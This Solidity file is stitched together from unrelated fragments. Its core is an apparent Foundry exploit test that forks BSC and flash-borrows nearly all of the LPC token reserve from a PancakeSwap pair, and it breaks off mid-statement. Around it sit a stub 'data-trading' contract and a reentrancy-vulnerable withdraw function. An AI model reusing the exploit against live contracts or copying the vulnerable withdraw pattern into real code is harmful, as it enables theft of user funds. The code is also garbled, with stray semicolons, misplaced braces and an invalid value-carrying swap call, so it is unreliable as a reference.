
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant attacker = 0xd9936EA91a461aA4B727a7e3661bcD6cD257481c;
address constant LPC = 0x1E813fA05739Bf145c1F182CB950dA7af046778d;
address constant pancakePair = 0x2ecD8Ce228D534D8740617673F31b7541f6A0099;
contract Exploit is Test {
    function setUp() public {
        cheat.createSelectFork("bsc", 19852596);
        cheat.label(LPC, "LPC");
        cheat.label(pancakePair, "PancakeSwap LPC/USDT")};
    function testExploit() public {
        emit log_named_decimal_uint("LPC balance",  IERC20(LPC).balanceOf(address(this)), 18);
        console.log("Get LPC reserve in PancakeSwap...");
        (uint256 LPC_reserve, ,) = IPancakePair(pancakePair).getReserves();
        emit log_named_decimal_uint("\tLPC Reserve", LPC_reserve, 18);
        console.log("Flashloan all the LPC reserve...");
        uint256 borrowAmount = LPC_reserve - 1;
        bytes memory data = unicode'';
        IPancakePair(pancakePair).swap{value: borrowAmount}(borrowAmount, 0, address(this), data);
        console.log("Flashloan ended");
        emit log_named_decimal_uint("LPC balance",  IERC20(LPC).balanceOf(address(this)), 18);
        console.log("\nNext transaction will swap LPC to USDT")};
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        console.log("\tSuccessfully borrow LPC from PancakeSwap");
        uint256 LPC_balance =
function sendToNoFallback(address payable recipient) public {
    recipient.transfer(1 ether)}
mapping(address => uint256) public balances;
function withdraw() public {
    if (balances[msg.sender] > 0) {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent);
        balances[msg.sender] = 0}